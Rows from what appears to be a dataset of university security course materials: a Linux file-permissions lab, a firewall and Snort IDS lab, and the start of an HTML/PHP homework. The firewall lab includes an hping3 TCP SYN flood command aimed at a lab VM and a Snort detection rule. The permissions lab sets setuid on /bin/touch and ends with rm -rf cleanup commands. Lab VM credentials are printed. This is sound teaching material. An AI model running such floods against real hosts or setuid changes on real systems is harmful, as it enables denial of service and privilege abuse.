b. chown user2:users /home/user2/HelloWorld
c. ls -l /home/user2/HelloWorld 
Q3: Who is its owner and what is its group?
Section 2: Differences in File and Folder Permissions
An objective of the following steps is to see the difference between file and folder (directory) 
permissions. The “chmod” command will be used to change the file and directory permissions to 
demonstrate these differences.
1. Observe the result of ls and cd commands
a. cd /
b. ls -l
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Lab: File Permissions in Linux
c. ls -al /home
Q4: Attach a screenshot of the result and answer the following question:
What are the directory permissions for the directories user1, user2 and test?
d. sudo su user1
e. ls -al /home/user2
Q5: Can you list the directory?
f. cd /home/user2
Q6: Can you change the directory?
2. Change the directory permissions of user2 (directory) and try again as user1 (user).
a. sudo su root 
b. chmod 740 /home/user2
c. Repeat steps 1d and 1f as user 1 (user).
Q7: Can you list or change the directory?
d. sudo su root
 e. chmod 750 /home/user2
f. Repeat steps 1d and 1f.
Q8: Can you list or change the directory?
g. touch /home/user2/hello12.txt
Q9: Can you create a new file?
h. sudo su root
i. This time, we will use symbolic options for chmod:
chmod g+w /home/user2
j. sudo su user1
k. Repeat step 2g. 
Q10: Can you create a new file?
l. ls -l /home/user2
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Lab: File Permissions in Linux
Section 3: Access control lists
Next, let us work with access control lists (ACL).
Open a new terminal window and confirm that you are the current user is “sec-lab”.
1. Create a new directory “test”:
mkdir test
make it current:
cd test
and create a new file file1:
touch file1
2. Check a default ACL for this file:
getfacl file1
Q11: Attach a screenshot of the result.
3. Set a read and write permission on file file1 for user2:
setfacl -m user2:rw file1
4. Confirm that the permissions has been set:
getfacl file1
5. Now, user1 should not be able to modify the file:
su user1
echo something > file1
exit
Q12: Attach a screenshot of the result.
6. At the same time, user 2 is able to do it:
su user2
echo something > file1
cat file1
exit
Q13: Attach a screenshot of the result.
7. Now, we remove the ACL:
setfacl -x user:user2 file1
8. Let us confirmed that the permissions have been revoked:
getfacl file1
Q14: Attach a screenshot of the result.
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Lab: File Permissions in Linux
Section 4: Text files and link files
Unix supports two kinds of link files—a hard link and a symbolic link. A hard link is a file with the 
actual address space of some ordinary file’s data blocks. A symbolic (or soft) link is just a reference to
another file. It contains the pathname to some other file. It is basically a shortcut to a file, which is 
typically used to access it. (Similarly to shortcuts in Windows.)
1. In the /test/temp/ directory, as the root user, create a new text file (“hello.txt”) and fill it with 
some text.
a. echo something > /test/temp/hello.txt
2. Create a link link_hello in the test folder pointing to hello.txt in the temp folder (refer to the file 
structure in the introduction of the file hierarchy).
a. cd /
b. ln -s /test/temp/hello.txt /test/link_hello
Q15: Is there any difference in file permissions of link_hello and hello.txt? Explain why. 
c. cat /test/link_hello
Q16: What is the output of the above command? Explain what you see.
Section 4: Default file permissions and group access control
Whenever a new file is created, a default set of permissions is assigned to it. Whatever the permissions 
are, Linux allows a user to filter out unwanted permissions set by default. This default setting can be set 
by the user via the “umask” command. The command takes the permissions set during creation of file 
and performs a bitwise AND to the bitwise negation of the mask value. Some common umask values 
are 077 (only user has permissions), 022 (only owner can write), 002 (only owner and group members 
can write), etc.
1. In a terminal window, make sure you are the root user, otherwise switch back to the root user.
2. Use umask command to check the current mask permission and assign a new mask.
a. umask
Q17: What is the current mask? How is it interpreted? (try umask –S or the man pages)
b. cd /test
c. touch testmask1
d. ls -al
e. Note the permissions of the file “testmask1”.
f. umask 0077
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Lab: File Permissions in Linux
g. touch testmask2
h. Note the permissions of the file “testmask2”.
Q18: What does it mean if the umask value is set to 0000?
What is the potential security risk associated with this value of umask?
Note: The risks of setting the extra bits (i.e., assigning their value to “1”) will be covered 
in the next section, which shows that the extra bits should not be set, in general.
Section 5: setuid bit, setgid bit and sticky bit
As explained in the ownership and permission section, the highest three bits of the permission value of 
a file represent the setuid bit, setgid bit and the sticky bit. If the setuid (setgid) bit is set on an 
executable file, then the uid will always be set that of the owner (group) of the file during execution. If 
the setuid/setgid bit is not set then the uid will be that of the user who executes the process. If the sticky 
bit is set on a directory, then only an owner of a file in this directory (and in addition the root user, of 
course) is able to rename or delete the file.
In the following exercise, the objective is to demonstrate how processes are affected when the setuid bit 
is set. Make sure that you begin this exercise with root privileges.
a. which touch
b. ls –l /bin/touch
c. chmod 4755 /bin/touch
d. ls –l /bin/touch
e. ls –l /home/user2
f. chmod 700 /home/user2
g. ls –l /home/user2 (observe timestamp and permissions)
h. sudo su user1 
i. touch /home/user2/HelloWorld
j. ls –l /home/user2 (observe timestamp, is it updated?)
k. sudo su root
l. chmod 0755 /bin/touch
m. sudo su user1
n. touch /home/user2/HelloWorld
Q19: Provide a screenshot of the result.
Explain why the permission is denied, even though it was previously allowed?
RESTORE THE SYSTEM
Below are the set of commands that you should issue to restore the system to its original form 
(commands No. 4 and 5 could take some time).
1. sudo su root
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Lab: File Permissions in Linux
2. umask 0022
3. chmod 0755 /bin/touch
4. userdel user1
5. userdel user2
6. rm -rf /home/user1
7. rm -rf /home/user2
8. rm -rf /test
9. rm -rf /home/test/
NOTE: You should type “exit” multiple times to come out of the user1 prompt 
before deleting this user.
Q20: Provide screenshot(s) of the result.
(Results of all the above commands from 1 to 9 must be shown.)"
"['file', 'file permissions', 'permissions', 'home', 'user', 'linux', 'set', 'root', 'permissions in linux', 'directory', 'test', 'users', 'bit', 'command', 'csce', 'fall', 'permission', 'sudo', 'linux file system', 'lab', 'files', 'link', 'root user', 'touch', 'group']",The University of North Texas,INTRO TO COMPUTER SECURITY,5550,File Permissions Linux 2,Lab,"Student Name:
Course: CSCE 5550
Semester: Fall 2022
Lab: File Permissions in Linux
Lab 3a: File Permissions in Linux
In this lab, you will be using the Ubuntu 20 VM. The credentials are: 
Username: sec-lab
Password: untccdc
NOTE: Address all the questions (Q1, Q2, etc.) marked in bold.
When a screenshot is requested, try to fit all the results in one image. 
If this is not possible, then attach multiple screenshots.
When a question is asked, e.g. “Who is the owner of the file?”, type your answer, 
do not simply provide a screenshot.
IMPORTANT NOTE: Before starting the lab, you must customize your command prompt as described 
in the Command Prompt Customization Manual. This customization manual directs you to place your 
EUID (Enterprise User ID) into the command prompt. Submissions which do not comply with this 
requirement will receive no credit.
Introduction
Unix File Hierarchy
The Unix/Linux file system is organized as a hierarchy with the root (/) directory at the highest level. 
(In this lab, we will use the terms “Unix” and “Linux” interchangeably.) Some typical Unix system 
directories are /usr, /bin, /sbin, /home, /var, /boot, /dev, /etc, and others. In the figure shown below, 
“user1” and “user2” are the subdirectories of the directory “home”, “hello.txt” is a plain text file and 
“link_hello” is a link file that points to “hello.txt”.
In order to access the file “/test/temp/hello.txt”, the system begins its search from the root (/) directory,
then “test” and “temp” directories consecutively, and then finally it finds the file “hello.txt”.
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Lab: File Permissions in Linux
Ownership and Permissions
Ownership of files in UNIX can be viewed in one of three ways: “owner” (creator), “group” or “others”
(i.e., all the other users, apart from the owner and the group members). Using this simple notion of 
ownership, access to files can be controlled by associating a unique user ID (UID) and a group ID 
(GID) with twelve permission bits for each file. Typically, these bits are divided into three sets of three 
bits each, as well as three extra bits as shown in the table below.
The values “r”, “w” and “x” stand for read, write and execute bits for each of the owner, group and 
others permissions. The values “su”, “sg” and “t” stand for set_user_id (setuid), set_group_id (setgid) 
and the sticky bit, respectively. These 4 sets of bits are often represented in their octal digits. 
For example, “100 111 101 101” is represented as “4755”. When the “su” bit is set, the UID of 
the process will be that of the owner of the file, no matter who executes the file. Similarly, if the “sg” 
bit is set, the GID of the process will be that of the group.
Section 1: Setting up the file structure and the user space
The objective of this section is to setup the file hierarchy structure and the user accounts that are 
required for the following sections. The “su” command is used to switch users.
1. Login as root
a. sudo su
b. enter password when prompted.
c. Now you are root, and the ‘#’ prompt represents the root mode 
(while the prompt ‘$’ represents the ordinary user mode).
2. Use useradd command to create two new users user1 and user2 as follows:
a. useradd user1 -g users 
b. mkdir /home/user1
c. chown user1:users /home/user1
d. useradd user2 -g users 
e. mkdir /home/user2
f. chown user2:users /home/user2
3. Use passwd command to set the password for the users you created (required in the case you 
want to log in). For convenience, set the passwords to be the same as the usernames. You need 
to retype the passwords and ignore password warnings:
a. passwd user1 
 New password: user1
 Retype new password: user1
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Lab: File Permissions in Linux
b. passwd user2
 New password: user2
 Retype new password: user2
4. Check user information with the id command. Note the uid, gid for each output.
a. id user1
b. id user2
Q1: Attach a screenshot of the result.
5. Create a directory structure:
a. mkdir /test
b. mkdir /test/temp 
6. Switch user roles as user1 and then back to root using the su command
a. whoami
b. sudo su user1 (check ‘$’ indicate user mode)
c. sudo su OR sudo su root
(Unable to switch to root? You might want to add user1 to the sudoers file.)
Note: Adding a user in the sudoers file:
1. Edit “/etc/sudoers” file and add the line described below.
2. Add this line for the users “<username> ALL=(ALL:ALL) ALL”
7. Create a new file as root user
a. touch /home/user2/HelloWorld
b. ls -l /home/user2/HelloWorld
Q2: Who is its owner and what is its group?
8. Change the group ownership as well as the user ownership of the file:
a. chgrp users /home/user2/HelloWorld
b. chown user2:users /home/user2/HelloWorld
c. ls -l /home/user2/HelloWorld 
Q3: Who is its owner and what is its group?
Section 2: Differences in File and Folder Permissions
An objective of the following steps is to see the difference between file and folder (directory) 
permissions. The “chmod” command will be used to change the file and directory permissions to 
demonstrate these differences.
1. Observe the result of ls and cd commands
a. cd /
b. ls -l
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Lab: File Permissions in Linux
c. ls -al /home
Q4: Attach a screenshot of the result and answer the following question:
What are the directory permissions for the directories user1, user2 and test?
d. sudo su user1
e. ls -al /home/user2
Q5: Can you list the directory?
f. cd /home/user2
Q6: Can you change the directory?
2. Change the directory permissions of user2 (directory) and try again as user1 (user).
a. sudo su root 
b. chmod 740 /home/user2
c. Repeat steps 1d and 1f as user 1 (user).
Q7: Can you list or change the directory?
d. sudo su root
 e. chmod 750 /home/user2
f. Repeat steps 1d and 1f.
Q8: Can you list or change the directory?
g. touch /home/user2/hello12.txt
Q9: Can you create a new file?
h. sudo su root
i. This time, we will use symbolic options for chmod:
chmod g+w /home/user2
j. sudo su user1
k. Repeat step 2g. 
Q10: Can you create a new file?
l. ls -l /home/user2
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Lab: File Permissions in Linux
Section 3: Access control lists
Next, let us work with access control lists (ACL).
Open a new terminal window and confirm that you are the current user is “sec-lab”.
1. Create a new directory “test”:
mkdir test
make it current:
cd test
and create a new file file1:
touch file1
2. Check a default ACL for this file:
getfacl file1
Q11: Attach a screenshot of the result.
3. Set a read and write permission on file file1 for user2:
setfacl -m user2:rw file1
4. Confirm that the permissions has been set:
getfacl file1
5. Now, user1 should not be able to modify the file:
su user1
echo something > file1
exit
Q12: Attach a screenshot of the result.
6. At the same time, user 2 is able to do it:
su user2
echo something > file1
cat file1
exit
Q13: Attach a screenshot of the result.
7. Now, we remove the ACL:
setfacl -x user:user2 file1
8. Let us confirmed that the permissions have been revoked:
getfacl file1
Q14: Attach a screenshot of the result.
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Lab: File Permissions in Linux
Section 4: Text files and link files
Unix supports two kinds of link files—a hard link and a symbolic link. A hard link is a file with the 
actual address space of some ordinary file’s data blocks. A symbolic (or soft) link is just a reference to
another file. It contains the pathname to some other file. It is basically a shortcut to a file, which is 
typically used to access it. (Similarly to shortcuts in Windows.)
1. In the /test/temp/ directory, as the root user, create a new text file (“hello.txt”) and fill it with 
some text.
a. echo something > /test/temp/hello.txt
2. Create a link link_hello in the test folder pointing to hello.txt in the temp folder (refer to the file 
structure in the introduction of the file hierarchy).
a. cd /
b. ln -s /test/temp/hello.txt /test/link_hello
Q15: Is there any difference in file permissions of link_hello and hello.txt? Explain why. 
c. cat /test/link_hello
Q16: What is the output of the above command? Explain what you see.
Section 4: Default file permissions and group access control
Whenever a new file is created, a default set of permissions is assigned to it. Whatever the permissions 
are, Linux allows a user to filter out unwanted permissions set by default. This default setting can be set 
by the user via the “umask” command. The command takes the permissions set during creation of file 
and performs a bitwise AND to the bitwise negation of the mask value. Some common umask values 
are 077 (only user has permissions), 022 (only owner can write), 002 (only owner and group members 
can write), etc.
1. In a terminal window, make sure you are the root user, otherwise switch back to the root user.
2. Use umask command to check the current mask permission and assign a new mask.
a. umask
Q17: What is the current mask? How is it interpreted? (try umask –S or the man pages)
b. cd /test
c. touch testmask1
d. ls -al
e. Note the permissions of the file “testmask1”.
f. umask 0077
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Lab: File Permissions in Linux
g. touch testmask2
h. Note the permissions of the file “testmask2”.
Q18: What does it mean if the umask value is set to 0000?
What is the potential security risk associated with this value of umask?
Note: The risks of setting the extra bits (i.e., assigning their value to “1”) will be covered 
in the next section, which shows that the extra bits should not be set, in general.
Section 5: setuid bit, setgid bit and sticky bit
As explained in the ownership and permission section, the highest three bits of the permission value of 
a file represent the setuid bit, setgid bit and the sticky bit. If the setuid (setgid) bit is set on an 
executable file, then the uid will always be set that of the owner (group) of the file during execution. If 
the setuid/setgid bit is not set then the uid will be that of the user who executes the process. If the sticky 
bit is set on a directory, then only an owner of a file in this directory (and in addition the root user, of 
course) is able to rename or delete the file.
In the following exercise, the objective is to demonstrate how processes are affected when the setuid bit 
is set. Make sure that you begin this exercise with root privileges.
a. which touch
b. ls –l /bin/touch
c. chmod 4755 /bin/touch
d. ls –l /bin/touch
e. ls –l /home/user2
f. chmod 700 /home/user2
g. ls –l /home/user2 (observe timestamp and permissions)
h. sudo su user1 
i. touch /home/user2/HelloWorld
j. sudo su root
k. ls –l /home/user2 (observe timestamp, is it updated?)
l. chmod 0755 /bin/touch
m. sudo su user1
n. touch /home/user2/HelloWorld
Q19: Provide a screenshot of the result.
Explain why the permission is denied, even though it was previously allowed?
RESTORE THE SYSTEM
Below are the set of commands that you should issue to restore the system to its original form 
(commands No. 4 and 5 could take some time).
1. sudo su root
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Lab: File Permissions in Linux
2. umask 0022
3. chmod 0755 /bin/touch
4. userdel user1
5. userdel user2
6. rm -rf /home/user1
7. rm -rf /home/user2
8. rm -rf /test
9. rm -rf /home/test/
NOTE: You should type “exit” multiple times to come out of the user1 prompt 
before deleting this user.
Q20: Provide screenshot(s) of the result.
(Results of all the above commands from 1 to 9 must be shown.)"
"['ids lab', 'ubuntu', 'attach a screenshot', 'firewalls and ids', 'ids', 'lab', 'sudo ufw', 'ufw', 'attach', 'csce', 'fall', 'firewalls', 'port', 'network', 'firewall', 'screenshot', 'kali', 'tcp syn', 'access', 'snort', 'sudo ufw deny', 'sudo', 'address', 'note', 'tcp syn flood']",The University of North Texas,INTRO TO COMPUTER SECURITY,5550,Firewalls IDS,Lab,"Student Name:
Course: CSCE 5550
Semester: Fall 2022
Firewalls and IDS Lab
Lab 2: Firewalls and IDS
In this lab, you will be using a special version of the Ubuntu 20 VM. 
Download the respective OVA file from the lab page and import it as usual.
The credentials are (same as before): 
Username: sec-lab
Password: untccdc
Also, you will use the Kali 20 VM, which will be the same as in the previous lab.
The credentials are (same as before): 
Username: osboxes
Password: osboxes.org
NOTE: Address all the questions (Q1, Q2, etc.) marked in bold.
When a screenshot is requested, try to fit all the results in one image. 
If this is not possible, then attach multiple screenshots.
When a question is asked, e.g., “Who is an owner of the file?”, type your answer, 
do not simply provide a screenshot.
IMPORTANT NOTE: Before starting the lab, you must customize your command prompt as described 
in the Command Prompt Customization Manual. This customization manual directs you to place your 
EUID (Enterprise User ID) into the command prompt. Submissions which do not comply with this 
requirement will receive no credit.
Introduction
A firewall is a software- or hardware-based network security system that controls the incoming and 
outgoing network traffic based on a particular set of rules. 
Firewalls are classified into different types: software firewall, hardware firewall, host-based, networkbased, etc. Most of the operating systems have a software firewall to protect against network threats. 
Hardware firewall is a dedicated piece of hardware which protects one or more networks against threats 
originating from the Internet. Many routers that connect networks have some firewall features built into 
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Firewalls and IDS Lab
them. Host-based firewalls are those that are present in a single host and that only manage the incoming 
and outgoing traffic for that host. A software firewall within an OS is a typical host-based firewall.
General-purpose computers such as a PC or a server (or even a VM) with multiple network adapters can 
be turned into a router or firewall by setting up suitable software on it. For example, a Linux PC with 
two or more network adapters can be made a firewall by installing firewall software such as iptables.
Below, we provide some network-related terms, which will be useful for this lab:
Subnet: A subnet is a logical group of IP addresses or a subdivision of an IP network. A subnet mask, 
which is a 32-bit value, definesthe range of IP addressesin that subnet. A router has to be present between 
the nodes in two different subnets in order to enable them to communicate to each other. 
Port Forwarding: Port forwarding is a way of making a computer on a home or business network 
accessible to computers on the Internet, even though they are behind a router. It is commonly used in 
gaming, file exchange, security camera setup, voice over IP, and other applications. After one has set up 
forwarding for a port, one is said to have an open port. In this lab, we will make our VM accessible to 
your host computer, and to other computers that belong to your local network.
UFW (Uncomplicated Firewall): This is a default firewall configuration tool for Ubuntu Linux. 
Developed to ease iptables firewall configuration, UFW provides a user-friendly interface to create 
an IPv4 or IPv6 host-based firewall. By default, UFW is disabled.
Configuration of port forwarding in the VM
Let us configure the VirtualBox VM network mode as “NAT”. Your host OS (i.e., the OS of your host 
computer running VirtualBox) will access to the VM through the port forwarding configured in 
the network setting of the VM.
1. Setup Ubuntu VM network settings as internal:
In VirtualBox: Select the Ubuntu VM ® Right-click ® Settings ® Network.
2. Under Adapter1, select “NAT” from the dropdown menu.
3. Click on Port Forwarding as shown on the below screenshot:
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Firewalls and IDS Lab
Then, enter the port forwarding rules as shown on the next screenshot:
Q1: Attach a screenshot of your port forwarding rules. (It should look the same as above.)
Now, let us confirm that the port forward works. If you use Windows open PuTTY on your host computer 
(an SSH/telnet client – install it, if you do not have it) and connect to localhost:2222.
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Firewalls and IDS Lab
If you use Linux/Mac OS, type “ssh sec-lab@localhost -p 2222” in the terminal.
Q2: Attach a screenshot of the result.
On your host computer, open the web browser and access “localhost:8080”.
Q3: Attach a screenshot of the result.
Section 1: UFW - Uncomplicated Firewall
When UFW is activated, it uses a default set of rules (profile) that should be fine for the average home 
user. In short, they can be summarized as all “incoming” is being denied, with some exceptions to make 
things easier for home users.
1. To turn UFW on with the default set of rules, type in the Linux terminal:
sudo ufw enable
2. To check the status of UFW:
sudo ufw status verbose
The output should resemble the following:
youruser@yourcomputer:~$ sudo ufw status verbose
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Firewalls and IDS Lab
[sudo] password for your user:
Status: active
Logging: on (low)
Default: deny (incoming), allow (outgoing)
New profiles: skip
youruser@yourcomputer:~$
Q4: Attach a screenshot of the terminal showing the status of UFW.
3. Now, we will try to block incoming SSH packets by blocking the port using UFW. 
In the Ubuntu VM, type:
sudo ufw deny ssh 
4. From your host, try to establish an SSH connection again, as you did before Question 2.
5. Also, try to connect via browser with “http://localhost:8080”—use a private mode 
(i.e., Private/Incognito/InPrivate window—the name depends on the browser).
Q5: Are you able to connect to your VM or get access to localhost website? 
Attach a screenshot and explain what happened. 
6. We are going to allow HTTP connections to the guest (Ubuntu VM acts now as a server). 
To allow incoming TCP packets on port 80 (http), type in the terminal of the Ubuntu VM:
sudo ufw allow 80/tcp
Note: We allow port 80 because it is the port of the HTTP server installed in the Ubuntu VM. 
The port 8080 is not used in the Ubuntu VM, it is only used for access from the host and it is redirected 
to port 80 of the VM.
From your host, try to access “localhost:8080” in the browser.
Q6: Attach a screenshot of the resulting browser window. 
Note: In the rest of the lab, we are going to deny outgoing connections from the Ubuntu VM.
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Firewalls and IDS Lab
7. Using UFW to block outgoing traffic to website “www.cnn.com”. The command syntax is as 
follows:
sudo ufw deny out from any to ip-address
To complete the above command, we need to know the IP address of the server www.cnn.com.
8. Type:
host -t a www.cnn.com
You may expect the output similar to the following:
www.cnn.com is an alias for turner-tls.map.fastly.net.
turner-tls.map.fastly.net has address 151.101.1.67
turner-tls.map.fastly.net has address 151.101.65.67
turner-tls.map.fastly.net has address 151.101.129.67
turner-tls.map.fastly.net has address 151.101.193.67
The main IP address of www.cnn.com is 151.101.1.67, but the server has alternative IP addresses 
151.101.65.67, 151.101.129.67, and 151.101.193.67.
Q7: Attach a screenshot of the result. 
Note: Alternatively, you can use the ping tool, but in this case, you will only get the main IP address. 
Type “ping www.cnn.com” and press “Control + C”, the output will be similar to the following:
PING turner-tls.map.fastly.net (151.101.1.67) 56(84) bytes of data.
64 bytes from 151.101.49.67: icmp_req=1 ttl=52 time=98.8 ms
64 bytes from 151.101.49.67: icmp_req=2 ttl=52 time=28.8 ms
64 bytes from 151.101.49.67: icmp_req=3 ttl=52 time=79.2 ms
9. Test in the guest OS (Ubuntu) browser, that you are able to access the www.cnn.com website. 
(Note: All tests in this lab are done in the browser of the Ubuntu VM.)
Q8: Attach a screenshot of the resulting browser window. 
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Firewalls and IDS Lab
10. Now, we will run the following command:
sudo ufw deny out from any to 151.101.1.67
After that, you may not be able to access to the www.cnn.com webpage.
11. Try to access www.cnn.com in the browser.
12. If you still are able to connect, follow the steps mentioned in the note below. 
Note: In order to completely deny access to the domain www.cnn.com, we need to cover all the IP 
addresses obtained using “host -t a www.cnn.com” along with the alternative IP addresses mentioned 
earlier. 
Q9: Attach a screenshot of the resulting browser window.
13. Check the UFW status again:
sudo ufw status verbose
Q10: Attach a screenshot of the result.
14. Delete the last rule using the following command:
sudo ufw delete deny out from any to 151.101.1.67
Note: If you have added more than one rule for restricting access to www.cnn.com, then delete 
all of the rules related to accessing this website.
Confirm that the access to the www.cnn.com page has been restored.
15. Now, we will block the access to the cse01.cse.unt.edu machine on the port 22 (SSH service). 
The command for adding this rule can be typed in the Ubuntu VM terminal as follows (you 
need to fill in the IP address and the port number):
sudo ufw deny out from any to ip-address port port-number
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Firewalls and IDS Lab
To test whether the rule is working, in a terminal, try to establish a connection to 
cse01.cse.unt.edu server at port 22 (default SSH port). Remember that you need to use your 
EUID as a username for this connection.
The corresponding command is: “ssh euid@cse01.cse.unt.edu”.
Q11: Attach a screenshot of the terminal showing that you cannot create a SSH connection.
(It must show that the SSH access is denied or not working anymore.)
16. Delete the above rule by typing: 
sudo ufw delete deny out from any to ip-addess port-number
17. Now, try to establish an SSH connection to cse01.cse.unt.edu again.
Q12: Were you able to establish a connection? Attach a screenshot of the result.
18. Terminate your session on CSE machine using the command “exit”, in case if you are logged in.
19. Reset UFW on your Ubuntu20 VM and disable it:
sudo ufw reset
sudo ufw disable
20. Power off the Ubuntu VM.
Section 2: Denial of Service (DoS) Attack – TCP SYN Flood
In this section, we will run the TCP SYN flooding attack against the Ubuntu VM (target) from the Kali 
VM (attacker). We will use the hping3 utility (www.hping.org), a TCP/IP packet assembler/analyzer –
it is commonly used for network testing and port scanning. 
Note: The Kali 20 VM will be the same as in the previous labs.
First, let us configure the VMs so that they can communicate with each other. Note that the VMs must 
be powered off during this configuration process.
1. Use the following Bridged Adapter settings for the Ubuntu VM:
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Firewalls and IDS Lab
 
2. We recommend you to “refresh” your Kali VM, i.e., to import it again from the respective OVA 
file. (Note that your previous work on that VM will be lost.)
3. Apply the following network adapter settings for the Kali VM:
4. Start both the VMs and login with the respective credentials (Kali: osboxes/osboxes.org, 
Ubuntu: sec-lab/untccdc).
5. On Kali VM, start the Terminal and type “ifconfig”. Notice the IP address and interface name
(it may be different in your case):
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Firewalls and IDS Lab
6. On Ubuntu VM, open the Terminal and type “ifconfig”. Notice the IP address and interface 
name (it may be different in your case):
7. Next, we will access the Ubuntu VM from Kali VM via HTTP.
Open the Firefox browser in Kali and type http://<ip address> as shown below.
You may expect to see the page as shown below.
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Firewalls and IDS Lab
8. From Kali VM, let us run an attack against the web server as follows:
Open the terminal and type the following command (omit the square brackets):
sudo hping3 [web server IP address] -p 80 -S --flood --rand-source
Let us briefly discuss the parameters of the above command.
• -p 80 : since we would like to attack the web server on the Ubuntu VM, we set the HTTP
port 80.
• -S : specifies TCP SYN packets.
• --flood : the packets are send as fast as possible and replies are ignored.
• --rand-source : a random IP source address is set.
Q13: Attach a screenshot of the result.
9. Run Wireshark on the Ubuntu VM:
sudo wireshark
In the Wireshark, start capturing packets.
Q14: Attach a screenshot of the result.
10. Access the Ubuntu VM via browser with address (http://[Ubuntu VM IP address]) from your 
Kali VM – use a new private window in the browser. Then, refresh your browser window 
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Firewalls and IDS Lab
several times. Probably, you can still access the Ubuntu VM, which shows that a single instance 
of hping have not yet overloaded the web server. If this is the case, then run another instance of 
the hping utility (use a new terminal window) – for this, repeat the steps described in Item 8.
11. Check if you are still able to access the web server – just refresh the browser window. If it is 
still possible, keep adding the hping instances until the access to the Ubuntu VM via browser 
becomes very slow (or stops completely). Now, this would indicate that the VM is overloaded 
by your DoS attack.
Note: Keep adding the hping instances until you have 10 of them running simultaneously. 
After that, proceed to the next step. 
Q15: Report your observations from the above steps. In particular, how many hping instances 
did you have to run? Did it slow down the access to Ubuntu VM via browser?
12. Stop all the hping instances on Kali VM (press Ctrl+C for exiting an hping process). 
Make sure that you stop/kill all the hping instances. At this moment, your VM might be still 
overloaded and you may not have access to it. If this is the case, rebooting it should solve 
the issue. Close Wireshark on Ubuntu.
Section 3: Intrusion Detection Systems (IDS) – Snort
IDS is a software/hardware system which monitors network traffic for attacks or policy violations. 
The policies are defined as a set of rules. When their violation is detected, IDS typically alerts
administrators and/or automatically deploys certain pre-set countermeasures. IDS is typically used 
inside the local network as the next line of defense after firewalls.
In this section, we will use the Snort IDS (https://www.snort.org) to detect the TCP SYN flood attack.
Again, the attacker will use the Kali VM and the Ubuntu VM will be a target.
13. Let us first install and configure Snort on the Ubuntu VM. (Note that Snort comes with some 
default rulesets.) Run the following command:
sudo apt-get install snort
You may expect to see a notification similar to the one shown below. 
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Firewalls and IDS Lab
14. Press Tab on the keyboard to move your selection to <Ok> and press Enter.
During the installation, you will need to specify your network information. Input your interface 
name as shown below. In our case, it was “enp0s3”. You can get your network information using 
the command “ifconfig”, as shown earlier. 
Note: If the terminal shows that ifconfig command is missing, then install the package net-tools
using the command “sudo apt-get install net-tools”.
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Firewalls and IDS Lab
15. Add network 10.120.0.0/16 to the next page with a comma as shown below.
Press Tab and then press Enter in the next screen. 
16. On the next page, select <Ok> by pressing Tab and then Enter.
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Firewalls and IDS Lab
After that, your installation will be complete.
Q16: Attach a screenshot of the result. (Only one screenshot, which shows the terminal after 
the installation has been completed, is enough.)
17. Next, we will slightly change the default output format of Snort to make it convenient for 
the purpose of this lab. 
Edit the file /etc/snort/snort.debian.conf with the root privilege (use “sudo”) and update the line 
starting with DEBIAN_SNORT_OPTIONS with the following:
DEBIAN_SNORT_OPTIONS="" -A full ""
18. Now, let us add a custom rule for the TCP SYN flood detection. For that, we will add the
following rule in the file /etc/snort/rules/dos.rules (as a new line at the end) using the root 
privilege:
alert tcp any any -> $HOME_NET 80 (flags: S; msg:""Possible TCP SYN flood""; 
detection_filter: track by_dst, count 50, seconds 10; sid:1000001;)
• The first six parameters of the above rule require to generate an alert for a TCP connection 
from any source IP address and port to any IP address in the protected network, port 80 
(http). 
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Firewalls and IDS Lab
• The following conditions, which are specified in the brackets, need to be met: the packet 
must be SYN, and the following rate must be exceeded (counted by the destination IP): 
within each 10-second frame, after 50 packets which satisfy the conditions, each next packet 
will trigger an alert. Note that these conditions define what frequency of packets will be 
considered an attack—this frequency must be substantially higher compared to what you 
normally expect for your network.
• The last parameter is a Snort identifier of your new rule. (We use this number because 
the SID’s before 1000000 are reserved by Snort.)
Q17: Attach a screenshot of the updated dos.rules file.
19. After you updated the dos.rules file, restart Snort by typing: 
/etc/init.d/snort restart
20. Next, run the attack described in Section 2 again from Kali VM (a single hping instance is 
sufficient).
21. Monitor the Snort log file, using the following command:
tail -f /var/log/snort/alert
You should be able to see the output with your own rule’s sid (1000001).
Q18: Attach a screenshot of the result. Explain what you see."
"['euid', 'php page', 'php', 'html page', 'html', 'page', 'data', 'form data', 'actual euid', 'form', 'html form', 'php code', 'file', 'main html page', 'html confirmation page', 'html and php', 'submitted form data', 'text', 'actual data', 'post', 'cse', 'html text', 'linux cse', 'submitted data', 'send form data']",The University of North Texas,SECURE ECOMMERCE,5560,HTML PHP,Homework,"Homework 2
                Due: 11:59 PM on Friday, February 18, 2022.

In this homework assignment, you will use HTML and PHP in writing a PHP script that processes an HTML form, including some server-side form validation using PHP. Please make sure to follow these instructions exactly as specified and not explicitly add other elements or features.
⦁        Creating an HTML Form
Your main HTML page, called <EUID>.html will contain a form that submits to <EUID>.php, where <EUID> should be replaced with your actual EUID. You will write an HTML page with your own data, following the general structure as follows:
 
The HTML page must contain the following elements:
⦁        Title of the page
⦁        A large heading centered at the top of the page, followed by a paragraph with at least three lines of text, but no more than five lines of text.
⦁        A horizontal rule separating the top half of the page from the bottom half.
⦁        A smaller heading centered just underneath the horizontal rule (i.e., smaller than the heading at the top of the page).
